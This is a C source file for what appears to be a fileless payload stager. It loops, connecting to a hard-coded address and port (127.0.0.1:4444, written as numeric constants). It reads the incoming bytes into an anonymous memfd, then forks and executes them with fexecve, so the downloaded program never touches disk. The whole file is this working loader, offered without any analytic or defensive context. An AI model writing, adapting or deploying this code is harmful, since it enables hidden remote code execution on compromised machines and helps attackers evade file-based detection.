#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <time.h>

#include <sys/syscall.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>


#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001U
#endif


static inline int memfd_create(const char *name, unsigned int flags) {
  return syscall(__NR_memfd_create, name, flags);
}


int main(int argc, char *argv[], char *envp[]) {
  int sock;
  int memfd;
  pid_t pid;
  struct sockaddr_in client;


  client.sin_family = AF_INET;
  //client.sin_port = htons(4444);
  client.sin_port = 0x5c11;
  //client.sin_addr.s_addr = inet_addr("127.0.0.1");
  client.sin_addr.s_addr = 16777343;

  for(;;) {
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);

    if (connect(sock, (struct sockaddr *)&client, sizeof(client)) == -1)
      goto i_need_to_sleep;

    memfd = memfd_create("asdf", MFD_CLOEXEC);
    if (memfd == -1)
      goto i_need_to_sleep;

    for(;;) {
      int n;
      char buf[1024];

      n = read(sock, buf, sizeof(buf));
      write(memfd, buf, n);

      if (n < sizeof(buf))
        break;
    }

    close(sock);

    pid = fork();
    if (pid == 0)
      fexecve(memfd, argv, envp);

    close(memfd);

  i_need_to_sleep:
    nanosleep((const struct timespec[]){{1, 0L}}, NULL);
  }

  return EXIT_SUCCESS;
}
